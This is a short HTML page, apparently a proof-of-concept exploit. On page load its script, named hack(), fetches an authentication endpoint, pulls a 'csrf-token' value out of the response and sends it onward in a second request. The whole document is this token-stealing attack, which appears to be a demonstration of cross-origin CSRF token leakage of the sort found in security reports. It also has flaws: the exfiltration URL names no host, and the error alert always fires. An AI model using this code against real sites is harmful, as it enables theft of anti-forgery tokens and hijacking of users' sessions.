<!DOCTYPE html>
<html>
<head>
<script>
function hack()
{
var xmlhttp;
if (window.XMLHttpRequest)
  {
  xmlhttp=new XMLHttpRequest();
  }
else
  {
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.open("GET","https://example.com/CPI/api/auth",false);
xmlhttp.send();
if(xmlhttp.status==200)
{
var str=xmlhttp.responseText;
alert("Response ::::::::" + str);
var n=str.search("csrf-token");
var c=str.substring(n+30,n+74);
var url = "http://" + encodeURIComponent(c);
xmlhttp.open("GET", url, true);
xmlhttp.send();
}{
alert("Error Response::::::::::::" + str);
}
}
</script>
</head>
<body onload="hack();">
</body>
</html>